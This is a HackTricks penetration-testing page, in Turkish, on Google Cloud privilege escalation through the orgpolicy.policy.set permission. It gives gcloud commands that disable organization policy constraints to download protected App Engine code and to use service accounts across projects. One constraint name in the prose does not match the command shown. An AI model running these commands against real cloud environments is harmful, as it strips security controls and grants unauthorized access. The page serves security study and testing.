# GCP - Orgpolicy Privesc

{{#include ../../../banners/hacktricks-training.md}}

## orgpolicy

### `orgpolicy.policy.set`

**orgpolicy.policy.set** kullanan bir saldırgan, organizasyon politikalarını manipüle edebilir; bu da belirli işlemleri engelleyen bazı kısıtlamaları kaldırmasına izin verir. Örneğin, **appengine.disableCodeDownload** kısıtı genellikle App Engine kaynak kodunun indirilmesini engeller. Ancak **orgpolicy.policy.set** kullanarak saldırgan bu kısıtlamayı devre dışı bırakabilir ve böylece başlangıçta korumalı olmasına rağmen kaynak kodunu indirme erişimi elde edebilir.
```bash
# Get info
gcloud resource-manager org-policies describe <org-policy> [--folder <id> | --organization <id> | --project <id>]

# Disable
gcloud resource-manager org-policies disable-enforce <org-policy> [--folder <id> | --organization <id> | --project <id>]
```
Bu yöntem için bir Python betiği [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/orgpolicy.policy.set.py).

### `orgpolicy.policy.set`, `iam.serviceAccounts.actAs`

Genellikle farklı bir projeden bir servis hesabını bir kaynağa eklemek mümkün değildir çünkü bu eylemi engelleyen **`iam.disableCrossProjectServiceAccountUsage`** adlı bir kısıtlama uygulanmaktadır.

Bu kısıtlamanın uygulanıp uygulanmadığını aşağıdaki komutu çalıştırarak doğrulayabilirsiniz:
```bash
gcloud resource-manager org-policies describe \
constraints/iam.disableCrossProjectServiceAccountUsage \
--project=<project-id> \
--effective

booleanPolicy:
enforced: true
constraint: constraints/iam.disableCrossProjectServiceAccountUsage
```
Bu, bir saldırıcının **`iam.serviceAccounts.actAs`** iznini suistimal ederek, örneğin başka bir projeden bir service account'u taklit edip yeni bir VM başlatmak için gerekli ek altyapı izinlerine sahip olmadan yetki yükseltmesine yol açabilecek davranışları engeller.

Ancak **`orgpolicy.policy.set`** izinlerine sahip bir saldırgan, **`iam.disableServiceAccountProjectWideAccess`** kısıtlamasını devre dışı bırakarak bu sınırlamayı aşabilir. Bu, saldırganın başka bir projeden bir service account'u kendi projesindeki bir kaynağa bağlamasına izin vererek yetkilerini etkili şekilde yükseltmesine olanak tanır.
```bash
gcloud resource-manager org-policies disable-enforce \
iam.disableCrossProjectServiceAccountUsage \
--project=<project-id>
```
## Referanslar

- [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
